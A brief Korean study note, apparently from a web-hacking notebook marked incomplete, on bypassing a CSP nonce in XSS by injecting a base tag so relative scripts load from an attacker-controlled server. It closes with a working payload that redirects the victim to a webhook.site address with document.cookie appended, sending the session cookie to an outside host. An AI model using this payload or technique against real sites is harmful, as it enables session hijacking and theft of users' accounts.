#web-hacking #incomplete
- 검색 키워드
	- XSS CSP Nonce bypass
	- csp nonce bypass
	- csp bypass
- 개인의 사이트가 있는 게 좋다.
- script.js
- base 태그를 활용해서 원하는 경로에서 파일을 탐색하도록 지정할 수 있다.
	- 단, 기본값으로 base-uri 지정하지 않은 경우에만 사용 가능하다.
- 자신의 서버 루트 경로에 실행하고 싶은 script.js를 작성한다.
- 예시
```javascript
<script>
location.href='https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6/'+document.cookie
</script>
```